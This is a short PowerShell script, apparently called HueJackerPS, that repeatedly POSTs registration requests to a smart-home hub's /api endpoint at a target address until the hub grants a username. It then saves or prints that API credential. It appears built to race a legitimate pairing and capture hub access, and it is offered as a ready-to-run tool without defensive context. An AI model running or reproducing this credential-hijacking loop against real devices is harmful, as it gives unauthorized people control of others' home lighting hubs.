Param(
  [Parameter(Mandatory=$true)] [string] $TargetAddress,
  [string] $DeviceType = 'anonymous',
  [int] $IntervalMilliseconds = 500,
  [string] $UsernamePath = '',
  [switch] $PrintFailures
)

$attempts = 0

while ($true)
{
  $res = Invoke-RestMethod `
    -Uri "http://$TargetAddress/api" `
    -Method POST `
    -Body (ConvertTo-Json @{devicetype = $DeviceType})
  
  if (![string]::IsNullOrEmpty($res.success))
  {
    if (![string]::IsNullOrEmpty($UsernamePath))
    {
      Out-File -Force -FilePath $UsernamePath -InputObject (ConvertTo-Json $res.success) -NoNewLine
      Write-Host "$($res.success) saved to $UsernamePath"
    }
    else
    {
      Write-Host "Acquired hub Username: $($res.success.username)"
    }
    
    exit 0
  }
  elseif (![string]::IsNullOrEmpty($res.error))
  {
    $attempts++
    
    if ($PrintFailures)
    {
      Write-Host ($res.error)
    }
    else
    {
      Clear-Host
      Write-Host "Running HueJackerPS. Number of attempts so far: $attempts"
    }
  }
  
  Start-Sleep -Milliseconds $IntervalMilliseconds
}